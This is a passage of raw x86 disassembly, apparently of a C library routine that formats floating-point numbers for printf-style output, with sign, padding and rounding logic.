mov eax, dword [ecx - 0x20]
test eax, eax
je 0x8067e2e
cmp dword [ecx - 0x30], 0x66
je 0x8067f40
mov eax, dword [ebx - 0x28]
test eax, eax
je 0x8067f00
cmp dword [ebx - 0x18], eax
jge 0x8067e80
xor esi, esi
mov dword [var_sp_ch], 0xa
mov eax, dword [ebx - 0x18]
mov dword [var_8h], eax
mov eax, dword [ebx - 0x14]
mov dword [var_4h], eax
mov eax, dword [ebx - 0x14]
mov dword [esp], eax
call fcn.0808cae0
test eax, eax
mov ecx, eax
je 0x8067e73
mov edx, dword [ebx - 0x18]
mov eax, dword [ebx - 0x14]
mov dword [eax + edx*4], ecx
inc dword [ebx - 0x18]
add esp, 0x1c
lea eax, [esi + 0x30]
pop ebx
pop esi
leave
ret
lea esi, [esi]
mov dword [var_14h], eax
mov eax, dword [ebx - 0x24]
mov dword [var_10h], eax
mov eax, dword [ebx - 0x18]
mov dword [var_sp_ch], eax
mov eax, dword [ebx - 0x14]
mov dword [var_4h], 0
mov dword [var_8h], eax
mov eax, dword [ebx - 0x2c]
mov dword [esp], eax
call fcn.0808c380
mov edx, dword [ebx - 0x2c]
mov esi, eax
mov eax, dword [ebx - 0x18]
sub eax, dword [ebx - 0x28]
mov dword [edx + eax*4], esi
mov eax, dword [ebx - 0x28]
mov esi, dword [edx]
test eax, eax
mov dword [ebx - 0x18], eax
je 0x8067eef
mov edx, dword [ebx - 0x14]
mov eax, dword [edx + eax*4 - 4]
test eax, eax
jne 0x8067ee4
mov eax, dword [ebx - 0x18]
dec eax
test eax, eax
mov dword [ebx - 0x18], eax
je 0x8067eef
mov eax, dword [edx + eax*4 - 4]
test eax, eax
je 0x8067ed1
mov ecx, dword [ebx - 0x18]
test ecx, ecx
jne 0x8067e40
mov dword [ebx - 0x18], 1
jmp 0x8067e73
nop
lea esi, [esi]
mov edx, dword [ebx - 0x18]
mov eax, dword [ebx - 0x14]
mov esi, dword [eax + edx*4 - 4]
mov dword [var_sp_ch], 0xa
mov eax, dword [ebx - 0x18]
dec eax
mov dword [var_8h], eax
mov eax, dword [ebx - 0x14]
mov dword [var_4h], eax
mov eax, dword [ebx - 0x14]
mov dword [esp], eax
call fcn.0808cae0
mov edx, dword [ebx - 0x14]
mov ecx, dword [ebx - 0x18]
mov dword [edx + ecx*4 - 4], eax
jmp 0x8067e73
nop
lea esi, [esi]
mov edx, dword [ecx - 0x1c]
xor esi, esi
lea eax, [edx - 1]
test edx, edx
mov dword [ecx - 0x1c], eax
jg 0x8067e73
jmp 0x8067e2e
nop
lea esi, [esi]
push ebp
mov ebp, esp
push edi
push esi
push ebx
sub esp, 0x108
mov eax, dword [arg_ch]
mov dword [var_74h], 0
mov ebx, dword [arg_10h]
mov dword [var_5ch], 0
mov dword [var_60h], 0
mov dword [var_68h], 0
mov dword [var_6ch], 0
mov dword [var_70h], 0
movzx edx, byte [eax + 0xd]
mov dword [var_2ch], 0
mov dword [var_40h], 0
mov eax, edx
shr al, 2
mov ecx, eax
and ecx, 1
and edx, 1
mov dword [var_7ch], ecx
jne 0x8069f03
mov eax, 0
test eax, eax
je 0x8069ef9
mov dword [esp], 3
call section.
mov eax, dword [eax + 4]
mov edx, 0
test edx, edx
mov eax, dword [eax + 0x24]
mov dword [var_54h], eax
je 0x8069eef
mov dword [esp], 3
call section.
mov eax, dword [eax + 4]
mov eax, dword [eax + 0x30]
mov dword [var_58h], eax
mov edx, dword [arg_ch]
mov dword [var_64h], 0
movzx eax, byte [edx + 0xc]
test al, 0x80
je 0x80680b7
test byte [edx + 0xd], 1
jne 0x8069ec8
mov ecx, 0
test ecx, ecx
je 0x8069ebe
mov dword [esp], 3
call section.
mov eax, dword [eax + 4]
mov eax, dword [eax + 0x2c]
mov dword [var_64h], eax
mov edx, dword [var_64h]
movzx eax, byte [edx]
test al, al
jle 0x8069eb2
cmp al, 0x7f
je 0x8069eb2
mov eax, dword [var_7ch]
test eax, eax
je 0x8069e5b
mov eax, dword [arg_ch]
test byte [eax + 0xd], 1
jne 0x8069e31
mov edx, 0
test edx, edx
je 0x8069e27
mov dword [esp], 3
call section.
mov eax, dword [eax + 4]
mov eax, dword [eax + 0x34]
mov dword [var_60h], eax
mov edi, dword [var_7ch]
test edi, edi
je 0x8069e01
mov esi, dword [var_60h]
test esi, esi
je 0x8069df5
mov edx, dword [arg_ch]
movzx eax, byte [edx + 0xc]
test al, 1
je 0x8069c67
mov eax, dword [ebx]
mov ebx, dword [eax]
mov esi, dword [eax + 4]
mov edi, dword [eax + 8]
mov dword [var_1ch], ebx
mov dword [var_18h], esi
mov dword [esp], ebx
mov dword [var_14h], edi
mov dword [var_4h], esi
mov dword [var_8h], edi
call fcn.080849f0
test eax, eax
je 0x8069b80
mov eax, 0
mov ebx, 0x80aad18
test eax, eax
je 0x8068106
mov dword [esp], 4
call section.
mov ebx, eax
mov edx, dword [ebx]
test edx, edx
je 0x8069b4b
mov ecx, dword [arg_ch]
mov eax, dword [ecx + 8]
test byte [edx + eax*2 + 1], 1
je 0x8069b38
mov dword [var_68h], 0x80a0fb4
mov dword [var_6ch], 0x80a0fc4
mov dword [var_40h], 0
mov edx, dword [var_68h]
test edx, edx
je 0x8068445
mov edx, dword [var_40h]
mov eax, dword [arg_ch]
test edx, edx
mov ebx, dword [eax + 4]
jne 0x8068154
test byte [eax + 0xc], 0x50
je 0x8068155
dec ebx
mov ecx, dword [arg_ch]
sub ebx, 3
test byte [ecx + 0xc], 0x20
jne 0x80681a0
test ebx, ebx
jle 0x80681a0
mov eax, dword [var_7ch]
test eax, eax
je 0x8068429
mov eax, dword [arg_8h]
mov dword [var_8h], ebx
mov dword [var_4h], 0x20
mov dword [esp], eax
call fcn.08075900
cmp eax, ebx
je 0x806819a
mov edx, 0xffffffff
lea esp, [var_bp_ch]
mov eax, edx
pop ebx
pop esi
pop edi
leave
ret
mov dword [var_74h], ebx
mov edx, dword [var_40h]
test edx, edx
je 0x8068372
mov eax, dword [var_7ch]
test eax, eax
je 0x8068347
mov ecx, dword [arg_8h]
mov edx, dword [ecx + 0x58]
mov eax, dword [edx + 0x10]
cmp eax, dword [edx + 0x14]
jae 0x806832b
mov dword [eax], 0x2d
add eax, 4
mov dword [edx + 0x10], eax
inc dword [var_74h]
mov eax, dword [var_7ch]
mov esi, 2
test eax, eax
je 0x80682b3
mov edx, dword [var_6ch]
mov eax, dword [var_7ch]
mov ecx, dword [edx]
add edx, 4
test eax, eax
mov dword [var_6ch], edx
je 0x806828a
mov eax, dword [arg_8h]
mov edx, dword [eax + 0x58]
mov eax, dword [edx + 0x10]
cmp eax, dword [edx + 0x14]
jae 0x8068278
mov dword [eax], ecx
add eax, 4
inc ecx
mov dword [edx + 0x10], eax
je 0x806818b
mov eax, esi
inc dword [var_74h]
dec esi
test eax, eax
jne 0x80681e4
mov eax, dword [arg_ch]
test byte [eax + 0xc], 0x20
je 0x8068257
test ebx, ebx
jle 0x8068257
mov esi, dword [var_7ch]
test esi, esi
je 0x806825f
mov edx, dword [arg_8h]
mov dword [var_8h], ebx
mov dword [var_4h], 0x20
mov dword [esp], edx
call fcn.08075900
cmp eax, ebx
jne 0x806818b
add dword [var_74h], ebx
mov edx, dword [var_74h]
jmp 0x8068190
mov ecx, dword [arg_8h]
mov dword [var_8h], ebx
mov dword [var_4h], 0x20
mov dword [esp], ecx
call fcn.08075680
jmp 0x806824c
mov edx, dword [arg_8h]
mov dword [var_4h], ecx
mov dword [esp], edx
call fcn.08075d10
inc eax
jmp 0x8068211
mov edx, dword [arg_8h]
mov eax, dword [edx + 0x14]
cmp eax, dword [edx + 0x18]
jae 0x80682a2
mov byte [eax], cl
movzx eax, cl
mov ecx, dword [arg_8h]
inc dword [ecx + 0x14]
jmp 0x8068287
movzx eax, cl
mov dword [esp], edx
mov dword [var_4h], eax
call fcn.0804d840
jmp 0x8068287
mov eax, dword [var_68h]
mov edi, dword [var_7ch]
movsx ecx, byte [eax]
inc eax
test edi, edi
mov dword [var_68h], eax
je 0x8068302
mov eax, dword [arg_8h]
mov edx, dword [eax + 0x58]
mov eax, dword [edx + 0x10]
cmp eax, dword [edx + 0x14]
jae 0x80682f0
mov dword [eax], ecx
add eax, 4
inc ecx
mov dword [edx + 0x10], eax
je 0x806818b
mov eax, esi
inc dword [var_74h]
dec esi
test eax, eax
jne 0x80682b3
jmp 0x8068221
mov edx, dword [arg_8h]
mov dword [var_4h], ecx
mov dword [esp], edx
call fcn.08075d10
inc eax
jmp 0x80682db
mov edx, dword [arg_8h]
mov eax, dword [edx + 0x14]
cmp eax, dword [edx + 0x18]
jae 0x806831a
mov byte [eax], cl
movzx eax, cl
mov ecx, dword [arg_8h]
inc dword [ecx + 0x14]
jmp 0x80682ff
movzx eax, cl
mov dword [esp], edx
mov dword [var_4h], eax
call fcn.0804d840
jmp 0x80682ff
mov dword [var_4h], 0x2d
mov dword [esp], ecx
call fcn.08075d10
inc eax
jne 0x80681d1
jmp 0x806818b
mov edx, dword [arg_8h]
mov eax, dword [edx + 0x14]
cmp eax, dword [edx + 0x18]
jae 0x8068360
mov byte [eax], 0x2d
mov ecx, dword [arg_8h]
inc dword [ecx + 0x14]
jmp 0x80681d1
mov dword [var_4h], 0x2d
mov dword [esp], edx
call fcn.0804d840
jmp 0x806833b
mov edx, dword [arg_ch]
movzx eax, byte [edx + 0xc]
test al, 0x40
je 0x80683c1
mov eax, dword [var_7ch]
test eax, eax
je 0x80683a7
mov ecx, dword [arg_8h]
mov edx, dword [ecx + 0x58]
mov eax, dword [edx + 0x10]
cmp eax, dword [edx + 0x14]
jae 0x806839d
mov dword [eax], 0x2b
jmp 0x80681cb
mov dword [var_4h], 0x2b
jmp 0x8068333
mov edx, dword [arg_8h]
mov eax, dword [edx + 0x14]
cmp eax, dword [edx + 0x18]
jae 0x80683b7
mov byte [eax], 0x2b
jmp 0x8068355
mov dword [var_4h], 0x2b
jmp 0x8068368
test al, 0x10
je 0x80681d4
mov eax, dword [var_7ch]
test eax, eax
je 0x8068400
mov eax, dword [arg_8h]
mov edx, dword [eax + 0x58]
mov eax, dword [edx + 0x10]
cmp eax, dword [edx + 0x14]
jae 0x80683e9
mov dword [eax], 0x20
jmp 0x80681cb
mov edx, dword [arg_8h]
mov dword [var_4h], 0x20
mov dword [esp], edx
jmp 0x8068336
lea esi, [esi]
mov ecx, dword [arg_8h]
mov eax, dword [ecx + 0x14]
cmp eax, dword [ecx + 0x18]
jae 0x8068419
mov byte [eax], 0x20
mov eax, dword [arg_8h]
inc dword [eax + 0x14]
jmp 0x80681d1
mov dword [var_4h], 0x20
mov dword [esp], ecx
jmp 0x806836b
mov edx, dword [arg_8h]
mov dword [var_8h], ebx
mov dword [var_4h], 0x20
mov dword [esp], edx
call fcn.08075680
jmp 0x8068187
mov esi, dword [var_28h]
mov dword [var_34h], 0
mov eax, esi
neg eax
cmp esi, 0xffffffff
cmovg eax, esi
lea edx, [eax + 0x3e]
add eax, 0x1f
cmovs eax, edx
sar eax, 5
lea eax, [eax*4 + 0x20]
sub esp, eax
lea ecx, [var_2bh]
sub esp, eax
lea edx, [var_2bh]
and ecx, 0xfffffff0
sub esp, eax
lea eax, [var_2bh]
and edx, 0xfffffff0
mov dword [var_20h], ecx
and eax, 0xfffffff0
mov dword [var_38h], edx
cmp esi, 2
mov dword [var_30h], eax
jle 0x8069749
mov eax, dword [var_70h]
mov dword [var_88h], 0
mov dword [var_8ch], 0xc
mov dword [var_90h], 0
mov dword [var_94h], 0x80a70f0
add eax, esi
test al, 0x1f
mov dword [var_9ch], eax
jne 0x80696c5
mov edi, dword [var_24h]
mov ebx, edi
dec ebx
js 0x806851a
lea edx, [ebp + ebx*4 - 0x48]
mov edi, eax
mov dword [var_f0h], edx
cmp edi, 0xffffffff
lea eax, [edi + 0x1f]
cmovg eax, edi
sar eax, 5
add eax, ebx
mov dword [var_f4h], eax
mov eax, dword [var_f0h]
sub dword [var_f0h], 4
dec ebx
mov edx, dword [eax]
mov eax, dword [var_f4h]
mov dword [ecx + eax*4], edx
jns 0x80684e8
mov edi, dword [var_24h]
mov edx, dword [var_70h]
lea eax, [edx + esi]
cmp eax, 0xffffffff
lea edx, [eax + 0x1f]
cmovle eax, edx
sar eax, 5
lea eax, [eax + edi]
mov dword [var_24h], eax
mov ecx, dword [var_70h]
xor ebx, ebx
lea edx, [ecx + esi]
lea esi, [esi]
cmp edx, 0xffffffff
lea eax, [edx + 0x1f]
cmovg eax, edx
sar eax, 5
cmp ebx, eax
jge 0x806855d
mov ecx, dword [var_20h]
mov dword [ecx + ebx*4], 0
inc ebx
jmp 0x8068540
mov ebx, dword [var_34h]
sub dword [var_94h], 0x10
mov eax, dword [var_88h]
mov edx, dword [var_94h]
add eax, dword [edx + 8]
dec eax
cmp esi, eax
jl 0x80685b1
test ebx, ebx
jne 0x8069670
mov ebx, dword [edx + 4]
mov esi, dword [edx]
mov edi, dword [var_38h]
cld
lea ecx, [ebx*4]
lea esi, [esi*4 + 0x80a6240]
shr ecx, 2
rep movsd dword es:[edi], dword ptr [esi]
cmp dword [var_24h], ebx
jg 0x8069623
je 0x8069605
mov ebx, dword [var_34h]
dec dword [var_8ch]
cmp dword [var_94h], 0x80a7020
jbe 0x80685c8
mov esi, dword [var_28h]
jmp 0x8068560
mov eax, dword [var_90h]
test ebx, ebx
mov dword [var_28h], eax
jle 0x806866f
mov edi, dword [var_30h]
xor esi, esi
mov eax, dword [edi]
test eax, eax
jne 0x8068605
mov ecx, dword [var_20h]
mov eax, dword [ecx]
mov edx, ecx
test eax, eax
jne 0x8068605
inc esi
lea eax, [esi*4]
mov ecx, dword [edi + eax]
test ecx, ecx
jne 0x8068605
mov ecx, dword [edx + eax]
test ecx, ecx
je 0x80685ef
bsr eax, dword [edi + ebx*4 - 4]
xor eax, 0x1f
mov dword [var_98h], eax
jne 0x806946b
test esi, esi
jle 0x806866f
mov eax, ebx
xor ecx, ecx
sub eax, esi
cmp dword [var_98h], eax
jge 0x8068641
mov edx, edi
mov eax, dword [edx + esi*4]
inc ecx
mov dword [edx], eax
mov ebx, dword [var_34h]
add edx, 4
mov eax, ebx
sub eax, esi
cmp ecx, eax
jl 0x806862d
mov edi, dword [var_24h]
xor ecx, ecx
sub ebx, esi
mov dword [var_34h], ebx
mov eax, edi
sub eax, esi
cmp ecx, eax
jge 0x806866a
mov edx, dword [var_20h]
mov eax, dword [edx + esi*4]
inc ecx
mov dword [edx], eax
mov edi, dword [var_24h]
add edx, 4
mov eax, edi
sub eax, esi
cmp ecx, eax
jl 0x8068656
sub edi, esi
mov dword [var_24h], edi
mov eax, dword [arg_ch]
mov edx, 0
xor edi, edi
test edx, edx
mov dword [var_cch], 0
mov dword [var_dch], 0
mov ebx, 0x80aad14
mov eax, dword [eax + 4]
mov dword [var_b4h], eax
je 0x80686ad
mov dword [esp], 5
call section.
mov ebx, eax
mov eax, dword [ebx]
test eax, eax
je 0x806943e
mov edx, dword [arg_ch]
mov ebx, dword [edx + 8]
cmp dword [eax + ebx*4], 0x65
je 0x80693f8
mov eax, 0
mov esi, 0x80aad14
test eax, eax
je 0x80686e3
mov dword [esp], 5
call section.
mov esi, eax
mov eax, dword [esi]
test eax, eax
je 0x80693c5
cmp dword [eax + ebx*4], 0x66
je 0x806934c
mov edx, dword [arg_ch]
mov dword [var_d4h], 6
mov eax, dword [edx]
test eax, eax
js 0x8068724
mov dword [var_d4h], eax
test eax, eax
mov eax, 1
cmovne eax, dword [var_d4h]
mov dword [var_d4h], eax
mov edx, dword [var_2ch]
test edx, edx
jne 0x8069340
mov ecx, dword [var_d4h]
cmp dword [var_28h], ecx
jge 0x8069315
mov eax, dword [var_28h]
mov dword [var_c8h], 0
mov esi, dword [var_d4h]
mov dword [var_3ch], 0x66
inc eax
test edx, edx
mov edx, dword [var_d4h]
cmovne eax, dword [var_c8h]
add edx, 5
mov dword [var_c4h], edx
mov dword [var_c8h], eax
sub esi, eax
mov ecx, dword [arg_ch]
mov eax, 0
mov dword [var_d8h], 0
test byte [ecx + 0xc], 8
cmovne eax, esi
mov dword [var_d0h], eax
mov eax, dword [var_64h]
test eax, eax
je 0x80687c0
mov edx, dword [var_64h]
mov ecx, dword [var_c8h]
mov dword [var_4h], edx
mov dword [esp], ecx
call fcn.08069f90
mov dword [var_dch], eax
add dword [var_c4h], eax
mov eax, dword [var_c4h]
xor ebx, ebx
shl eax, 3
cmp eax, 0x1000
ja 0x8069300
mov ebx, 1
xor eax, eax
test ebx, ebx
sete al
test eax, eax
mov dword [var_c0h], eax
jne 0x80692cf
mov ecx, dword [var_c4h]
lea eax, [ecx*4 + 0x18]
sub esp, eax
lea eax, [var_2bh]
and eax, 0xfffffff0
mov dword [var_b8h], eax
mov edx, dword [var_b8h]
mov eax, dword [var_2ch]
add edx, 8
test eax, eax
mov dword [var_bch], edx
mov ebx, edx
je 0x806882e
cmp dword [var_3ch], 0x66
je 0x80692af
mov ecx, dword [var_c8h]
cmp dword [var_cch], ecx
jge 0x8068871
sub ecx, dword [var_cch]
mov dword [var_cch], ecx
lea ecx, [var_bp_ch]
dec dword [var_cch]
call fcn.08067e10
mov ecx, dword [var_cch]
mov dword [ebx], eax
add ebx, 4
test ecx, ecx
jne 0x8068848
mov eax, dword [var_c8h]
mov dword [var_cch], eax
mov edx, dword [arg_ch]
mov dword [var_d8h], 1
test byte [edx + 0xc], 8
jne 0x8068892
mov edx, dword [var_d0h]
test edx, edx
jle 0x806928b
mov ecx, dword [var_58h]
mov dword [ebx], ecx
add ebx, 4
cmp edi, dword [var_d0h]
jl 0x80688b0
cmp edi, esi
jge 0x80688ec
cmp dword [var_24h], 1
jle 0x8069279
lea ecx, [var_bp_ch]
inc edi
call fcn.08067e10
mov dword [ebx], eax
add ebx, 4
cmp eax, 0x30
je 0x806924a
mov dword [var_d8h], 1
cmp edi, dword [var_d0h]
jl 0x80688b0
cmp edi, esi
jge 0x80688ec
cmp dword [var_24h], 1
jg 0x80688b0
mov eax, dword [var_20h]
mov eax, dword [eax]
test eax, eax
jne 0x80688b0
lea ecx, [var_bp_ch]
call fcn.08067e10
cmp eax, 0x34
jle 0x8068937
cmp eax, 0x35
mov edx, ebx
je 0x80691de
test edi, edi
jle 0x8068924
mov eax, dword [ebx - 4]
lea edx, [ebx - 4]
cmp eax, dword [var_58h]
je 0x8068924
cmp eax, 0x39
je 0x80691c0
cmp eax, dword [var_58h]
je 0x8068924
inc eax
mov dword [edx], eax
test edi, edi
je 0x8069031
mov ecx, dword [var_58h]
cmp dword [edx], ecx
je 0x8069031
cmp edi, dword [var_d0h]
jle 0x8068949
cmp dword [ebx - 4], 0x30
je 0x8069016
test edi, edi
jne 0x8068962
mov eax, dword [arg_ch]
test byte [eax + 0xc], 8
jne 0x8068962
mov edx, dword [var_58h]
lea eax, [ebx - 4]
cmp dword [ebx - 4], edx
cmove ebx, eax
mov edi, dword [var_64h]
test edi, edi
je 0x8068998
mov ecx, dword [var_dch]
mov eax, dword [var_60h]
mov edx, dword [var_64h]
mov dword [var_8h], ecx
mov dword [var_4h], eax
mov ecx, dword [var_cch]
mov eax, dword [var_bch]
mov dword [esp], edx
mov edx, ebx
call fcn.08069ff0
sub esp, 0xc
mov ebx, eax
mov eax, dword [var_3ch]
cmp eax, 0x66
je 0x80689eb
mov dword [ebx], eax
mov esi, dword [var_28h]
mov ecx, 0xa
add ebx, 4
xor eax, eax
mov edx, ebx
add ebx, 4
cmp dword [var_2ch], 0
setne al
cmp ecx, esi
lea eax, [eax + eax + 0x2b]
mov dword [edx], eax
mov edx, esi
jg 0x80689d1
lea eax, [ecx + ecx*4]
lea ecx, [eax + eax]
cmp ecx, edx
jle 0x80689c7
cmp edx, 9
jg 0x8068fe5
mov dword [ebx], 0x30
add ebx, 4
lea eax, [esi + 0x30]
mov dword [ebx], eax
add ebx, 4
mov edx, dword [var_40h]
test edx, edx
jne 0x80689fb
mov ecx, dword [arg_ch]
test byte [ecx + 0xc], 0x50
je 0x8068a01
dec dword [var_b4h]
mov eax, ebx
sub eax, dword [var_bch]
sar eax, 2
sub dword [var_b4h], eax
mov eax, dword [arg_ch]
test byte [eax + 0xc], 0x20
jne 0x8068a69
mov eax, dword [eax + 0x10]
cmp eax, 0x30
je 0x8068a69
mov esi, dword [var_b4h]
test esi, esi
jle 0x8068a69
mov ecx, dword [var_7ch]
test ecx, ecx
je 0x8068fc7
mov edx, dword [var_b4h]
mov ecx, dword [arg_8h]
mov dword [var_4h], eax
mov dword [var_8h], edx
mov dword [esp], ecx
call fcn.08075900
cmp eax, dword [var_b4h]
jne 0x806818b
mov eax, dword [var_b4h]
mov edx, dword [var_40h]
mov dword [var_74h], eax
test edx, edx
je 0x8068f11
mov edx, dword [var_7ch]
test edx, edx
je 0x8068ee6
mov ecx, dword [arg_8h]
mov edx, dword [ecx + 0x58]
mov eax, dword [edx + 0x10]
cmp eax, dword [edx + 0x14]
jae 0x8068eca
mov dword [eax], 0x2d
add eax, 4
mov dword [edx + 0x10], eax
mov edx, dword [arg_ch]
inc dword [var_74h]
movzx eax, byte [edx + 0xc]
test al, 0x20
jne 0x8068ab5
mov ecx, dword [arg_ch]
cmp dword [ecx + 0x10], 0x30
je 0x8068e5f
mov eax, dword [var_7ch]
xor edi, edi
mov dword [var_e0h], 0
test eax, eax
jne 0x8068b6d
mov ecx, dword [var_54h]
mov dword [esp], ecx
call fcn.08053400
mov dword [var_e8h], 0
mov dword [var_ech], eax
mov eax, dword [var_5ch]
test eax, eax
je 0x8068aff
mov eax, dword [var_5ch]
mov dword [esp], eax
call fcn.08053400
mov dword [var_e8h], eax
mov edi, dword [var_c0h]
test edi, edi
jne 0x8068e22
mov ecx, dword [var_dch]
mov eax, dword [var_c4h]
imul ecx, dword [var_e8h]
add eax, dword [var_ech]
lea eax, [ecx + eax + 0x14]
and eax, 0xfffffffc
sub esp, eax
lea eax, [var_2bh]
and eax, 0xfffffff0
mov dword [var_e0h], eax
mov esi, dword [var_bch]
mov edi, dword [var_e0h]
cmp esi, ebx
jae 0x8068b6d
mov eax, dword [esi]
cmp eax, dword [var_58h]
je 0x8068e0f
cmp eax, dword [var_60h]
je 0x8068def
movzx eax, byte [esi]
mov byte [edi], al
inc edi
add esi, 4
cmp esi, ebx
jb 0x8068b4c
mov eax, dword [arg_ch]
mov ecx, dword [var_e0h]
test byte [eax + 0xd], 8
mov dword [var_e4h], ecx
jne 0x8068dd8
mov esi, dword [var_7ch]
test esi, esi
je 0x8068dcb
mov esi, ebx
sub esi, dword [var_bch]
sar esi, 2
mov ecx, dword [var_7ch]
test ecx, ecx
je 0x8068dba
sub ebx, dword [var_bch]
sar ebx, 2
test ebx, ebx
jne 0x8068d7c
mov edi, dword [var_7ch]
test edi, edi
je 0x8068cf3
mov eax, esi
dec esi
test eax, eax
je 0x8068c11
mov eax, dword [var_bch]
mov ebx, dword [var_7ch]
mov ecx, dword [eax]
add eax, 4
test ebx, ebx
mov dword [var_bch], eax
je 0x8068cca
mov eax, dword [arg_8h]
mov edx, dword [eax + 0x58]
mov eax, dword [edx + 0x10]
cmp eax, dword [edx + 0x14]
jae 0x8068cb5
mov dword [eax], ecx
add eax, 4
inc ecx
mov dword [edx + 0x10], eax
je 0x806818b
mov eax, esi
inc dword [ebp - 0x74]
dec esi
test eax, eax
jne 0x8068bca
mov eax, dword [var_c0h]
test eax, eax
jne 0x8068c94
mov ecx, dword [arg_ch]
test byte [ecx + 0xc], 0x20
je 0x8068257
mov eax, dword [ebp - 0xb4]
test eax, eax
jle 0x8068257
mov eax, dword [ebp - 0x7c]
test eax, eax
je 0x8068c73
mov eax, dword [ebp - 0xb4]
mov edx, dword [ebp + 8]
mov dword [esp + 8], eax
mov eax, dword [ecx + 0x10]
mov dword [esp], edx
mov dword [esp + 4], eax
call fcn.08075900
cmp eax, dword [ebp - 0xb4]
jne 0x806818b
mov eax, dword [ebp - 0xb4]
add dword [ebp - 0x74], eax
jmp 0x8068257
mov ecx, dword [ebp - 0xb4]
mov edx, dword [ebp + 0xc]
mov dword [esp + 8], ecx
mov ecx, dword [ebp + 8]
mov eax, dword [edx + 0x10]
mov dword [esp], ecx
mov dword [esp + 4], eax
call fcn.08075680
jmp 0x8068c59
mov eax, dword [var_e0h]
mov dword [esp], eax
call fcn.08051180
mov edx, dword [var_b8h]
mov dword [esp], edx
call fcn.08051180
jmp 0x8068c1b
mov edx, dword [arg_8h]
mov dword [var_4h], ecx
mov dword [esp], edx
call fcn.08075d10
inc eax
jmp 0x8068c01
mov edx, dword [arg_8h]
mov eax, dword [edx + 0x14]
cmp eax, dword [edx + 0x18]
jae 0x8068ce2
mov byte [eax], cl
movzx eax, cl
mov ecx, dword [arg_8h]
inc dword [ecx + 0x14]
jmp 0x8068cc4
movzx eax, cl
mov dword [esp], edx
mov dword [var_4h], eax
call fcn.0804d840
jmp 0x8068cc4
mov eax, esi
dec esi
test eax, eax
je 0x8068c11
mov eax, dword [var_e4h]
mov edx, dword [var_7ch]
movsx ecx, byte [eax]
inc eax
test edx, edx
mov dword [var_e4h], eax
je 0x8068d53
mov eax, dword [arg_8h]
mov edx, dword [eax + 0x58]
mov eax, dword [edx + 0x10]
cmp eax, dword [edx + 0x14]
jae 0x8068d41
mov dword [eax], ecx
add eax, 4
inc ecx
mov dword [edx + 0x10], eax
je 0x806818b
mov eax, esi
inc dword [ebp - 0x74]
dec esi
test eax, eax
jne 0x8068cfe
jmp 0x8068c11
mov edx, dword [arg_8h]
mov dword [var_4h], ecx
mov dword [esp], edx
call fcn.08075d10
inc eax
jmp 0x8068d2c
mov edx, dword [arg_8h]
mov eax, dword [edx + 0x14]
cmp eax, dword [edx + 0x18]
jae 0x8068d6b
mov byte [eax], cl
movzx eax, cl
mov ecx, dword [arg_8h]
inc dword [ecx + 0x14]
jmp 0x8068d50
movzx eax, cl
mov dword [esp], edx
mov dword [var_4h], eax
call fcn.0804d840
jmp 0x8068d50
mov edx, dword [var_7ch]
mov ecx, dword [arg_8h]
test edx, edx
mov eax, dword [ecx + 0x94]
mov edx, dword [var_bch]
cmove edx, dword [var_e4h]
mov dword [var_8h], esi
mov dword [esp], ecx
mov dword [var_4h], edx
call dword [eax + 0x1c]
mov edx, 0xffffffff
cmp eax, esi
jne 0x8068190
add dword [var_74h], esi
jmp 0x8068c11
sub edi, dword [var_e4h]
cmp edi, 0x14
jle 0x8068bb8
jmp 0x8068d7c
mov esi, edi
sub esi, dword [var_e4h]
jmp 0x8068b9c
mov dword [var_4h], edi
mov dword [esp], ecx
call fcn.08067c40
mov dword [var_e4h], eax
jmp 0x8068b86
mov eax, dword [var_e8h]
mov edx, dword [var_5ch]
mov dword [var_8h], eax
mov dword [var_4h], edx
mov dword [esp], edi
call fcn.08053740
mov edi, eax
jmp 0x8068b66
mov edx, dword [var_ech]
mov ecx, dword [var_54h]
mov dword [var_8h], edx
mov dword [var_4h], ecx
jmp 0x8068e00
mov edx, dword [var_dch]
mov eax, dword [var_c4h]
imul edx, dword [var_e8h]
add eax, dword [var_ech]
lea eax, [edx + eax + 2]
mov dword [esp], eax
call fcn.08050fe0
mov edx, 0xffffffff
test eax, eax
mov dword [var_e0h], eax
jne 0x8068b3c
jmp 0x8068190
mov eax, dword [var_b4h]
test eax, eax
jle 0x8068ab5
mov eax, dword [var_7ch]
test eax, eax
je 0x8068eab
mov eax, dword [var_b4h]
mov edx, dword [arg_8h]
mov dword [var_4h], 0x30
mov dword [var_8h], eax
mov dword [esp], edx
call fcn.08075900
cmp eax, dword [var_b4h]
jne 0x806818b
mov edx, dword [var_b4h]
add dword [var_74h], edx
jmp 0x8068ab5
mov ecx, dword [var_b4h]
mov eax, dword [arg_8h]
mov dword [var_4h], 0x30
mov dword [var_8h], ecx
mov dword [esp], eax
call fcn.08075680
jmp 0x8068e91
mov dword [var_4h], 0x2d
mov dword [esp], ecx
call fcn.08075d10
inc eax
jne 0x8068a9a
jmp 0x806818b
mov edx, dword [arg_8h]
mov eax, dword [edx + 0x14]
cmp eax, dword [edx + 0x18]
jae 0x8068eff
mov byte [eax], 0x2d
mov ecx, dword [arg_8h]
inc dword [ecx + 0x14]
jmp 0x8068a9a
mov dword [var_4h], 0x2d
mov dword [esp], edx
call fcn.0804d840
jmp 0x8068eda
mov ecx, dword [arg_ch]
movzx eax, byte [ecx + 0xc]
test al, 0x40
je 0x8068f72
mov eax, dword [var_7ch]
test eax, eax
je 0x8068f4c
mov eax, dword [arg_8h]
mov edx, dword [eax + 0x58]
mov eax, dword [edx + 0x10]
cmp eax, dword [edx + 0x14]
jae 0x8068f3c
mov dword [eax], 0x2b
jmp 0x8068a94
mov edx, dword [arg_8h]
mov dword [var_4h], 0x2b
mov dword [esp], edx
jmp 0x8068ed5
mov ecx, dword [arg_8h]
mov eax, dword [ecx + 0x14]
cmp eax, dword [ecx + 0x18]
jae 0x8068f65
mov byte [eax], 0x2b
mov eax, dword [arg_8h]
inc dword [eax + 0x14]
jmp 0x8068a9a
mov dword [var_4h], 0x2b
mov dword [esp], ecx
jmp 0x8068f0a
test al, 0x10
je 0x8068aa4
mov eax, dword [var_7ch]
test eax, eax
je 0x8068fa7
mov ecx, dword [arg_8h]
mov edx, dword [ecx + 0x58]
mov eax, dword [edx + 0x10]
cmp eax, dword [edx + 0x14]
jae 0x8068f9a
mov dword [eax], 0x20
jmp 0x8068a94
mov dword [var_4h], 0x20
jmp 0x8068ed2
mov edx, dword [arg_8h]
mov eax, dword [edx + 0x14]
cmp eax, dword [edx + 0x18]
jae 0x8068fba
mov byte [eax], 0x20
jmp 0x8068ef4
mov dword [var_4h], 0x20
jmp 0x8068f07
mov edx, dword [var_b4h]
mov ecx, dword [arg_8h]
mov dword [var_4h], eax
